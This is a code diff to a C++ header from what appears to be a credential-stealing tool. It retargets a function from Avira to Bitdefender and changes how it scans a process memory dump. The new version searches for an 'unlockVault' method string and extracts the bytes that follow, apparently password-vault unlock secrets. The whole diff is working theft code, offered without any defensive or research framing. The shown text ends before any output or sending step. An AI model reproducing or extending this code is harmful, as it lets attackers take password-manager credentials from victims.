@@ -1,11 +1,11 @@
 #pragma once
 #include <iostream>
 #include <fstream>
-#include <vector>
 #include <string>
+#include <vector>
 #include "../core/saveFile.h"
 
-int getCredsavira() {
+int getCredsbitdefender() {
     std::ifstream file("app.dmp", std::ios::binary);
 
     if (!file.is_open()) {
@@ -13,24 +13,33 @@ int getCredsavira() {
         return 1;
     }
 
-    std::vector<unsigned char> searchPattern = { 0x21, 0x6a, 0x19, 0x00, 0x19, 0x02, 0x00, 0x00, 0x19, 0x02, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x8d, 0x05, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00 };
-    std::vector<unsigned char> foundData;
+    std::string searchKeyword = "\"methodName\":\"unlockVault\"";
+    std::string foundData;
 
     while (!file.eof()) {
-        unsigned char c;
-        file.read(reinterpret_cast<char*>(&c), sizeof(c));
+        char c;
+        file.get(c);
 
-        if (c == searchPattern[foundData.size()]) {
-            foundData.push_back(c);
-            if (foundData.size() == searchPattern.size()) {
-                // We found the search pattern, now collect data until reaching the 600 data limit
+        if (c == searchKeyword[foundData.size()]) {
+            foundData += c;
+            if (foundData == searchKeyword) {
+                // We found the search keyword, now collect data until 10 binary spaces (00) are found
                 std::vector<unsigned char> extractedData;
-                int dataCount = 0;
+                int consecutiveSpaces = 0;
 
-                while (dataCount < 600 && !file.eof()) {
+                while (!file.eof()) {
                     file.read(reinterpret_cast<char*>(&c), sizeof(c));
+                    if (c == 0x00) {
+                        consecutiveSpaces++;
+                        if (consecutiveSpaces == 10) {
+                            break; // 10 consecutive binary spaces found
+                            // We can check for more spaces if we want
+                        }
+                    }
+                    else {
+                        consecutiveSpaces = 0;
+                    }
                     extractedData.push_back(c);
-                    dataCount++;
                 }
 
                 // Convert the binary data to a UTF-8 string
